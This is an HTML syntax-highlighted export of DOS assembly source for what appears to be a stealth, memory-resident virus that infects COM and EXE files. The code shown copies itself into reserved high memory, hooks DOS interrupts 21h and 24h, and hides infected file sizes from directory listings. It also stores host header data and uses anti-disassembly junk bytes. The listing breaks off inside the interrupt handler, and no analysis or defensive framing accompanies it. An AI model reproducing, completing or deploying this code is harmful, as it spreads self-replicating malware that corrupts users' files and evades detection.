<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">sec</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
</span><span class="sc5">ideal</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">      </span><span class="sc1">;every file will increase by this ammount of bytes</span><span class="sc0">

</span><span class="sc1">;           ∞∞∞∞∞∞∞          ∞∞∞∞∞∞         ∞∞∞∞∞∞∞         ∞∞∞∞∞∞∞</span><span class="sc0">
</span><span class="sc1">;          ∞±±±±±±±∞        ∞±±±±±±∞       ∞±±±±±±±∞       ∞±±±±±±±∞</span><span class="sc0">
</span><span class="sc1">;         ∞±≤≤≤≤≤≤≤±∞      ∞±≤≤≤≤≤≤±∞     ∞±≤≤≤≤≤≤≤±∞     ∞±≤≤≤≤≤≤≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€€€€≤±∞    ∞±≤€€€€€€≤±∞   ∞±≤€€€€€€€≤±∞   ∞±≤€€€€€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤≤≤≤±∞   ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€€€€≤±∞   ∞±≤€€€€≤±±±∞    ∞±≤€€€€€€€≤±∞   ∞±≤€€€€€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€≤≤≤±∞    ∞±≤€€€€≤≤≤≤±∞   ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€≤±±∞     ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞  ∞±≤€€€€≤€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;        ∞±≤€€€€≤±∞       ∞±≤€€€€€€≤±∞   ∞±≤€€€€€€€≤±∞   ∞±≤€€€€€€€≤±∞</span><span class="sc0">
</span><span class="sc1">;         ∞±≤≤≤≤±∞         ∞±≤≤≤≤≤≤±∞     ∞±≤≤≤≤≤≤≤±∞     ∞±≤≤≤≤≤≤≤±∞</span><span class="sc0">
</span><span class="sc1">;          ∞±±±±∞           ∞±±±±±±∞       ∞±±±±±±±∞       ∞±±±±±±±∞</span><span class="sc0">
</span><span class="sc1">;           ∞∞∞∞             ∞∞∞∞∞∞         ∞∞∞∞∞∞∞         ∞∞∞∞∞∞∞</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Ver</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">cpt1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">;Checkpoint 1</span><span class="sc0">

</span><span class="sc5">enc_start</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dummyjmp1</span><span class="sc0">

</span><span class="sc5">marker</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;com / exe marker (0=com, 1=exe)</span><span class="sc0">

</span><span class="sc5">dummyjmp1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">is_a_com</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exe_cpt1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exe_cpt2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cont_install</span><span class="sc0">

</span><span class="sc5">is_a_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">cont_install</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">one_three</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C001h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">07DFFh</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">

                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0D00Dh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">startup_fail</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">one_three</span><span class="sc0">

</span><span class="sc1">;               cmp     sp,-10h</span><span class="sc0">
</span><span class="sc1">;               jb      startup_fail</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0000h</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">startup_fail</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">tsr_para</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">startup_fail</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0012h</span><span class="sc4">],</span><span class="sc5">tsr_para</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0012h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">one_three</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">cpt3</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">;Checkpoint 3</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">cpt3</span><span class="sc4">-</span><span class="sc5">cpt1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">cpt4</span><span class="sc4">-</span><span class="sc5">cpt1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">total</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">cpt4</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">;Checkpoint 4</span><span class="sc0">

</span><span class="sc5">startup_fail</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">dummycpt1</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">marker</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc5">dummycpt1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">file_is_exe</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0">
</span><span class="sc5">rpl1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">rpl2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">file_is_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">cpt2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">;Checkpoint 2</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Data Area                                                   *</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc1">;sft             equ     005Ch   ;3Ah</span><span class="sc0">

</span><span class="sc5">ofs_scan_crc</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0050h</span><span class="sc0">   </span><span class="sc1">;+3</span><span class="sc0">
</span><span class="sc5">ofs_chk_ver</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0053h</span><span class="sc0">   </span><span class="sc1">;+1              version number</span><span class="sc0">
</span><span class="sc5">ofs_chk_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0054h</span><span class="sc0">   </span><span class="sc1">;+2              version size</span><span class="sc0">
</span><span class="sc5">ofs_chk_sig</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0056h</span><span class="sc0">   </span><span class="sc1">;+4              signature</span><span class="sc0">

</span><span class="sc5">header</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">005Ah</span><span class="sc0">
</span><span class="sc5">ofs_first_3</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">005Ah</span><span class="sc0">   </span><span class="sc1">;+3              three first bytes in COM</span><span class="sc0">
</span><span class="sc5">ofs_time</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">008Dh</span><span class="sc0">   </span><span class="sc1">;+2</span><span class="sc0">
</span><span class="sc5">ofs_date</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">008Fh</span><span class="sc0">   </span><span class="sc1">;+2</span><span class="sc0">
</span><span class="sc5">ofs_attr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0091h</span><span class="sc0">   </span><span class="sc1">;2</span><span class="sc0">

</span><span class="sc5">sft_attr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">     </span><span class="sc1">;(byte)</span><span class="sc0">
</span><span class="sc5">sft_time</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Dh</span><span class="sc0">     </span><span class="sc1">;(word)</span><span class="sc0">
</span><span class="sc5">sft_date</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Fh</span><span class="sc0">     </span><span class="sc1">;(word)</span><span class="sc0">
</span><span class="sc5">sft_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">11h</span><span class="sc0">     </span><span class="sc1">;(dword)</span><span class="sc0">

</span><span class="sc1">;                        ;CRC signature added by "SCAN /AV"</span><span class="sc0">
</span><span class="sc1">;scan_sig        db      0f0h,0fdh,0c5h,0aah,0ffh,0f0h</span><span class="sc0">

</span><span class="sc5">set_sgm</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc5">f_size</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">bb_stat</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cntr</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">r_cntr</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;; DISK S. DATA ;;;</span><span class="sc0">
</span><span class="sc5">x_first3</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'   '</span><span class="sc0">
</span><span class="sc5">x_version</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">x_size</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">x_sig</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'    '</span><span class="sc0">

</span><span class="sc5">stat</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stat2</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">handle</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_handle</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;_dx             dw 0</span><span class="sc0">
</span><span class="sc1">;_ds             dw 0</span><span class="sc0">
</span><span class="sc5">_bytes</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">val_len</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pos</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pos2</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">append</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">stealth1st</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;DISK S DATA ENDS;;;</span><span class="sc0">

</span><span class="sc1">;db 'Only The Good Die Young'</span><span class="sc0">


</span><span class="sc5">jmp_to</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">push_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jmp_to</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jmp_to</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">pop_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jmp_to</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jmp_to</span><span class="sc4">]</span><span class="sc0">





</span><span class="sc5">handle_dir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">back_handle_dir</span><span class="sc0">

</span><span class="sc1">;                cmp     ax,0</span><span class="sc0">
</span><span class="sc1">;                jne     back_handle_dir</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stealth_dir_handle</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">back_handle_dir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">fcb_dir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">back_fcb_dir</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stealth_dir_fcb</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">back_fcb_dir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">




</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interupt 24 handler                                         *</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc5">ni24</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Call OLD Interrupt 21 Handler</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">org21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interupt 21 handler                                         *</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc5">ni21</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pushf</span><span class="sc0">

</span><span class="sc1">;cmp ah,40h</span><span class="sc0">
</span><span class="sc1">;je __read</span><span class="sc0">

</span><span class="sc1">;jmp no_fcb12 ;no_bogus</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_fcb11</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_dir</span><span class="sc0">
</span><span class="sc5">no_fcb11</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_fcb12</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fcb_dir</span><span class="sc0">
</span><span class="sc5">no_fcb12</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_bogus</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Fh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_bogus</span><span class="sc0">
</span><span class="sc5">__read</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_read</span><span class="sc0">

</span><span class="sc5">no_bogus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc0">
